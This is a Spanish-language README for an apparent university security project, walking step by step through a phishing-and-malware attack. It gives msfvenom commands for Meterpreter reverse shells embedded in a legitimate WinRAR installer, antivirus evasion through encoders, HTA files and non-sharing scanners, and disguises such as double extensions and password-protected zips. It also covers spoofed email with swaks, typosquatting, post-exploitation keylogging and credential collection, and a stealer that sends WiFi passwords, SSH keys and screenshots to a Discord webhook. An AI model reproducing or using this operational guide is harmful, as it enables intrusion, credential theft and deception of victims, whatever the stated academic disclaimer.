# Proyecto Grupo 4 - Ingeniería Social, Payload y Extracción de Información

> **Educational purposes only.** Este repositorio fue desarrollado como proyecto académico para la materia de Seguridad Informática. Todo el contenido existe para demostrar conceptos de ciberseguridad ofensiva en entornos controlados y con autorización explícita. Usar estas técnicas contra sistemas sin permiso escrito del propietario es ilegal.

---

## ¿De qué trata este proyecto?

Un atacante puede obtener acceso completo a la computadora de otra persona sin hackear ningún sistema, sin explotar vulnerabilidades técnicas, y sin que el antivirus haga nada. Solo necesita que esa persona abra un archivo.

Eso es ingeniería social: manipular a las personas en lugar de atacar las máquinas.

Este proyecto demuestra el flujo completo de ese proceso. Se crea un archivo que parece legítimo, se le envía a la víctima mediante correo o red social, y en el momento en que lo abre el atacante obtiene información del sistema, contraseñas de WiFi, capturas de pantalla y más, todo enviado en tiempo real a un canal de Discord.

---

## Diagrama del ataque

```
ATACANTE (Kali Linux)                        VÍCTIMA (Windows/Linux)
─────────────────────────────────────────────────────────────────────
                                                
  1. Genera el payload                         
     msfvenom → archivo.exe                   
                                                
  2. Disfraza el archivo                       
     le cambia el ícono, lo                   
     comprime con contraseña                  
                                                
  3. Envía por ingeniería social               
     ──── correo "oficial" ──────────────────► 4. Víctima abre el correo
     ──── link de Drive ──────────────────────► 5. Víctima descarga el archivo
                                                   6. Víctima ejecuta el archivo
                                                
  8. Recibe la conexión ◄────────────────────── 7. El archivo llama al atacante
     sesión Meterpreter                             por HTTPS (puerto 443)
                                                
  9. Extrae información:                       
     - sysinfo (sistema operativo)            
     - getuid + SID (usuario)                 
     - dir (directorio actual)                
     - WiFi, procesos, screenshot             
                                                
  10. Todo llega a Discord ◄──────── stealer.py corre en segundo plano
      en tiempo real                          
```

---

## Herramientas que se usan

`Kali Linux` es el sistema operativo del atacante. Viene con todas las herramientas de seguridad preinstaladas.

`Metasploit Framework` es una suite de herramientas para pruebas de penetración. Incluye `msfvenom` para crear payloads y `msfconsole` para recibir conexiones.

`msfvenom` es el generador de payloads. Crea el archivo malicioso con el tipo de conexión, la IP destino y el puerto configurados.

`Meterpreter` es el tipo de sesión que se establece una vez que la víctima abre el archivo. Da acceso a comandos para explorar y extraer información del sistema.

`swaks` es una herramienta de línea de comandos para enviar correos desde cualquier dirección.

`Discord Webhook` es una URL que Discord te da para que aplicaciones externas puedan enviar mensajes a un canal. Lo usamos para recibir los datos robados en tiempo real.

---

## Estructura del repositorio

```
grupo4-seguridad/
│
├── README.md               este archivo - explicación completa del proyecto
├── setup.sh                instala todas las dependencias en Kali de una sola vez
├── generar_payload.sh      genera el payload de Metasploit pidiendo la IP
├── listener.rc             configura el handler de Metasploit automáticamente
│
├── stealer.py              stealer multiplataforma en Python
│                           corre directo en Kali y compila a .exe para Windows
│
└── capturas/               carpeta para las screenshots del proyecto funcionando
```

---

## Paso 1 - Preparar el entorno

Ejecuta el script de configuración que instala todo lo necesario:

```
bash setup.sh
```

O de forma manual:

```
sudo apt-get update
sudo apt-get install -y metasploit-framework swaks icoutils zip wget python3 python3-pip
pip3 install pillow requests pyinstaller
```

---

## Paso 2 - Conocer tu IP

El payload necesita saber a qué dirección llamar cuando la víctima lo abra.

Para ver tu IP en la red local:

```
ip a
```

El número que aparece después de `inet` en la interfaz `eth0` es tu IP local. Por ejemplo `192.168.1.15`.

Si la víctima está en otra red y van a hacer la prueba por internet:

```
curl ifconfig.me
```

Si no puedes abrir puertos en el router, usa ngrok para crear un túnel:

```
ngrok tcp 443
```

Ngrok te da una dirección pública como `0.tcp.ngrok.io:12345`. En ese caso tu LHOST es `0.tcp.ngrok.io` y tu LPORT es `12345`.

---

## Paso 3 - Generar el payload con Metasploit

Usa el script del repositorio:

```
bash generar_payload.sh
```

O el comando manualmente:

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=TU_IP LPORT=443 -f exe -o actualizacion_sistema.exe
```

Explicación de cada parámetro:

`-p windows/x64/meterpreter/reverse_https` define el tipo de payload. Windows porque la víctima usa Windows. x64 porque es de 64 bits. reverse_https significa que la víctima es la que llama al atacante, no al revés, lo que evita los firewalls. HTTPS hace que el tráfico parezca navegación web normal.

`LHOST` es tu IP, la dirección a la que se conecta la víctima.

`LPORT 443` es el puerto estándar de HTTPS, ningún firewall lo bloquea.

`-f exe` define el formato del archivo de salida.

`-o actualizacion_sistema.exe` es el nombre del archivo que se crea.

---

## Paso 4 - Evadir el antivirus

El archivo que genera msfvenom por defecto es detectado porque su firma ya está en las bases de datos de los antivirus. Para pasarlo hay varias técnicas.

**Técnica 1 - Inyectar en un ejecutable legítimo:**

Descargas un instalador real de cualquier programa conocido:

```
wget https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe -O instalador_real.exe
```

Generas el payload inyectado dentro de ese instalador:

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=TU_IP LPORT=443 -x instalador_real.exe -k -f exe -o instalador_infectado.exe
```

El `-x` indica que use ese archivo como plantilla. El `-k` hace que el instalador original funcione normalmente mientras el payload corre en segundo plano. La víctima ve WinRAR instalarse sin problema.

**Técnica 2 - Encoders para ofuscar el código:**

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=TU_IP LPORT=443 -e x64/xor_dynamic -i 15 -f exe -o payload_encoded.exe
```

El `-e x64/xor_dynamic` es el encoder. El `-i 15` le dice que pase el encoder 15 veces para que la firma cambie más.

**Técnica 3 - Formato HTA en lugar de EXE:**

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=TU_IP LPORT=443 -f hta-psh -o documento.hta
```

Los archivos HTA los ejecuta Windows nativamente y los antivirus los escanean con menos agresividad que los EXE.

**Verificar la detección antes de enviar:**

Sube el archivo a antiscan.me, no a VirusTotal. VirusTotal comparte las muestras con los fabricantes de antivirus lo que quema el payload en horas. Antiscan.me no comparte nada.

```
https://antiscan.me
```

---

## Paso 5 - Disfrazar el archivo

**Doble extensión:**

Windows oculta las extensiones de archivo por defecto. Si el archivo se llama `Informe_Final.pdf.exe`, la víctima solo ve `Informe_Final.pdf`. Para aplicar esto solo renombras el archivo.

**Cambiar el ícono:**

Descarga un ícono de PDF en formato .ico y cámbiaselo al ejecutable:

```
sudo apt-get install icoutils
icotool -x icono_pdf.ico
```

O la forma más rápida: si ya inyectaste el payload en WinRAR, el archivo hereda el ícono de WinRAR automáticamente.

**Comprimir con contraseña:**

```
zip -e Informe_Final.zip Informe_Final.pdf.exe
```

El escáner del servidor de correo no puede ver dentro de un zip con contraseña. Pones la contraseña en el cuerpo del correo.

---

## Paso 6 - Configurar el listener antes de enviar

El listener tiene que estar activo antes de que la víctima abra el archivo.

Forma automática:

```
msfconsole -r listener.rc
```

Forma manual:

```
msfconsole
```

Dentro de msfconsole, uno por uno:

```
use exploit/multi/handler
```

Selecciona el módulo que espera conexiones entrantes.

```
set payload windows/x64/meterpreter/reverse_https
```

Tiene que coincidir exactamente con el payload que generaste.

```
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false
set AutoRunScript post/windows/gather/enum_system
run
```

`ExitOnSession false` mantiene el listener activo después de recibir la primera conexión. `AutoRunScript` corre automáticamente el módulo de reconocimiento cuando alguien conecta, así la información del sistema aparece sola.

---

## Paso 7 - Enviar el archivo usando ingeniería social

**Por correo con swaks (suplantando cualquier remitente):**

```
swaks --to victima@correo.com \
      --from soporte.ti@empresa.com \
      --server smtp.gmail.com:587 \
      --auth LOGIN \
      --auth-user TU_CORREO@gmail.com \
      --auth-password TU_PASSWORD_DE_APP \
      --tls \
      --header "Subject: Documento compartido - revisión requerida" \
      --header "From: Soporte TI <soporte.ti@empresa.com>" \
      --body "Hola,\n\nDocumento adjunto. Contraseña del archivo: 1234\n\nSaludos" \
      --attach Informe_Final.zip
```

Para usar Gmail necesitas crear una contraseña de aplicación en myaccount.google.com, sección Seguridad, Verificación en dos pasos, Contraseñas de aplicaciones.

La dirección del remitente visible puede ser cualquier cosa. La víctima ve el nombre que pongas.

**Por link de Google Drive:**

Sube el archivo manualmente a drive.google.com, copia el link y mándalo en un correo simple. Drive no escanea ejecutables comprimidos. El correo no tiene adjuntos sospechosos, solo un link de Google.

**Por typosquatting:**

Registra un dominio parecido al real por unos tres dólares en Namecheap o Porkbun. Si la empresa usa `empresa.com` tú registras `empresa-soporte.com`. Configuras Zoho Mail en ese dominio y mandas el correo directamente. Pasa todos los filtros porque es un dominio real.

---

## Paso 8 - Obtener la información requerida por el proyecto

Cuando la víctima ejecuta el archivo, en tu terminal aparece:

```
[*] Meterpreter session 1 opened (TU_IP:443 -> IP_VICTIMA:PUERTO)
```

Conectarte a la sesión:

```
sessions -i 1
```

Los comandos que pide el proyecto:

```
sysinfo
```

Muestra el nombre del equipo, versión del sistema operativo, arquitectura y dominio.

```
getuid
```

Muestra el usuario actual con el formato DOMINIO\usuario.

```
run post/windows/gather/enum_system
```

Obtiene el SID completo, usuarios del sistema, grupos y configuración de red.

```
shell
whoami /user
dir
```

`shell` abre una terminal de Windows. `whoami /user` muestra el nombre y SID en una línea. `dir` lista el directorio actual.

---

## Paso 9 - El stealer autónomo: stealer.py

El stealer es un programa independiente que no necesita Metasploit. Cuando alguien lo abre, en silencio recopila información y la manda a Discord. Lo más importante para la demo: **ves los datos llegar en tiempo real en tu teléfono**.

**Lo que hace:**

Obtiene el hostname, usuario, sistema operativo, IP local e IP pública. Extrae el SID del usuario en Windows o el UID/GID en Linux. Lista el contenido del directorio actual. Saca las contraseñas de todas las redes WiFi guardadas. Lista los procesos activos. En Linux lee el historial de bash y busca claves SSH. Toma una captura de pantalla completa. Todo llega a tu canal de Discord.

**Cómo configurarlo:**

Abre `stealer.py` y cambia la línea del webhook:

```python
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/TU_ID/TU_TOKEN"
```

Para crear el webhook: Discord → tu servidor → clic derecho en un canal → Editar canal → Integraciones → Webhooks → Nuevo Webhook → Copiar URL.

**Correrlo directamente en Kali para probarlo:**

```
pip3 install pillow requests
python3 stealer.py
```

Los datos llegan a tu Discord en segundos.

**Compilarlo a .exe para enviarlo a una víctima Windows:**

```
pip3 install pyinstaller
pyinstaller --onefile --noconsole stealer.py
```

El `.exe` queda en la carpeta `dist/stealer.exe`. Es un ejecutable independiente que no necesita Python instalado en la máquina de la víctima.

`--onefile` empaqueta todo en un solo archivo.

`--noconsole` hace que corra sin abrir ninguna ventana, la víctima no ve nada.

Para enviar el exe a la víctima aplica las mismas técnicas de los pasos 5 y 7.

---

## Paso 10 - Comandos adicionales de Meterpreter

Estos no los pide el proyecto pero los puedes mostrar en la expo para demostrar el alcance real del acceso obtenido.

```
screenshot
```

Captura la pantalla de la víctima en tiempo real.

```
keyscan_start
keyscan_dump
keyscan_stop
```

Activa, descarga y detiene un keylogger que registra todo lo que escribe la víctima.

```
getsystem
```

Intenta elevar privilegios a SYSTEM, el nivel más alto en Windows.

```
run post/windows/gather/credentials/credential_collector
```

Extrae credenciales guardadas en el sistema.

```
download C:\\ruta\\archivo.docx /home/kali/
```

Descarga cualquier archivo de la máquina de la víctima.

---

## Paso 11 - Qué hacer si la sesión no conecta

Verifica que el LHOST y LPORT del payload coincidan exactamente con los del listener.

Verifica que el puerto no esté ocupado:

```
sudo ss -tlnp | grep 443
```

Si el antivirus eliminó el archivo aplica más técnicas del Paso 4, especialmente la combinación de inyección en ejecutable real más encoder.

Verifica que ambas máquinas se pueden alcanzar:

```
ping TU_IP
```

Ejecutado desde la máquina víctima.

Si usas ngrok verifica que el túnel sigue activo y que el puerto no cambió. Si cambió hay que generar el payload de nuevo con el nuevo puerto.

---

## Glosario para el profesor y los estudiantes

`Payload` es el código malicioso que se ejecuta en la máquina de la víctima. El nombre viene del inglés y significa "carga útil".

`Reverse shell` es una conexión donde la víctima llama al atacante, no al revés. Esto evita los firewalls que bloquean conexiones entrantes pero permiten las salientes.

`Meterpreter` es un tipo avanzado de reverse shell que da acceso a muchos comandos sin necesidad de subir archivos adicionales. Corre completamente en memoria y no deja rastros en el disco.

`LHOST` (Listening Host) es la IP del atacante donde el payload va a conectarse.

`LPORT` (Listening Port) es el puerto en el que el atacante está escuchando. El 443 es el estándar de HTTPS.

`Ingeniería social` es la técnica de manipular personas para que hagan algo, en este caso abrir un archivo. No explota vulnerabilidades técnicas, explota la confianza humana.

`Handler` es el proceso en Metasploit que espera y recibe las conexiones del payload.

`Session` en Metasploit es la conexión activa con una máquina comprometida.

`SID` (Security Identifier) es el identificador único que Windows asigna a cada usuario y grupo. Se usa internamente para controlar permisos.

`Webhook` es una URL que un servicio te da para que otros programas puedan enviarle datos automáticamente. Discord los ofrece para integrar bots y notificaciones.

`Encoder` en Metasploit es un módulo que modifica los bytes del payload para cambiar su firma y evitar la detección.

`Evasión de AV` son las técnicas para que un archivo malicioso pase los filtros del antivirus sin ser detectado.

`PyInstaller` es una herramienta que convierte un script de Python en un ejecutable independiente que no necesita Python instalado para correr.

---

## Información del grupo

Proyecto de la materia de Seguridad Informática.

Integrantes: Cossio Brenda, López Quezada Lisman, Guerra Acosta Cristian.

Tarea asignada: Generar un archivo malicioso que será enviado a la víctima vía correo electrónico o red social. El archivo debe ser confeccionado de forma que sea creíble e invite a la víctima a ejecutarlo. La información mínima a obtener del equipo víctima es la siguiente: información del sistema, SID, nombre del usuario actual y listado del directorio actual.
